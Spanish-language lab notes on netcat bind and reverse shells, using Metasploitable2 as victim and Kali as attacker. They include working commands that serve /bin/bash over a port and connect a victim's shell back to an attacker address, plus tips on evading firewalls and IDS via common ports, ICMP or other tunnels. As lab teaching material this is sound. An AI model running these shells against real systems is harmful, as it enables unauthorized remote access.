Practica de [[Explotación]]

netcat, llamado mediante el comando nc, es un conjunto de implementaciones, una de las mas modernas por ejemplo es ncat. Las implementaciones pueden establecer comunicaciones entre ellas sin problema.

En ejemplo de bind shell, usaremos msfadmin en metasploitable2 como victima y Kali como atacante.

En la maquina victima lanzamos nc:

``` bash
nc -nlvp 4444 -e /bin/bash
```

-l implica que nc esta en modo escucha 
-p indica el puerto de escucha, en este caso el 4444
-n es para que no haga traduccion de numeros a nombre
-v modo verbose
-e el binario a servir en conexion (salida del binario)

Desde la maquina atacante, iniciamos la bind shell:

``` bash
ncat -nv 192.168.56.102 4444
```


!!! - La terminal que obtenemos con netcat tiende a ser bastante limitada (ej: no tiene autocompletado, no tiene historico de comandos... Es decir, es una terminal **NO INTERACTIVA**), y siempre tendra los privilegios del usuarios que sirvio el escuchador.

Algo a tener en cuenta tambien esque con este tipo de shells inestables, CTRL + C cancelara la sesion en vez de cancelar el comando.

Tambien hay que tener en cuenta que a dia de hoy la mayoria de firewalls cortan las conexiones del exterior, por lo que las bind shells tienden a no funcionar. Por eso se usan las **reverse shell**:

Una reverse shell implica que el primer paquete de la conexion sale de la victima.

Ahora ponemos a la escucha a nuestra maquina atacante (esto tiene un pequeño riesgo, ya que podrian iniciar una bind shell contra nosotros):

``` bash
nc -nlvp 4444
```

Y en la maquina victima iniciamos la conexion, ofreciendo la terminal, esto se puede de hacer de millones de formas distintas (ver InternalAllTheThings (salido de PayloadsAllTheThings)):

``` bash
nc -v 192.168.56.100 4444 -e /bin/bash
```

Una evolucion en ejercicios Red Team seria establecer un sistema C2 para tener conexiones con ejecucion remota de comandos sin depender de una tuberia abierta de forma constante (facilmente detectable por IDS).

En cuanto a que puerto/puertos a utilizar. En caso de bind shell, una que permita que se inicie esa conexion, con la reverse shell ocurre exactamente lo mismo. Por ejemplo el puerto 443, 80, etc. que de normal son usados por servicios comunes. Tambien podriamos optar por crear tuneles con otros protocolos que no sean tcp o udp y utilizar por ejemplo ICMP. Hoy en dia hay canales incluso a traves de protocolos de correo o de sincronizacion de horas.

---


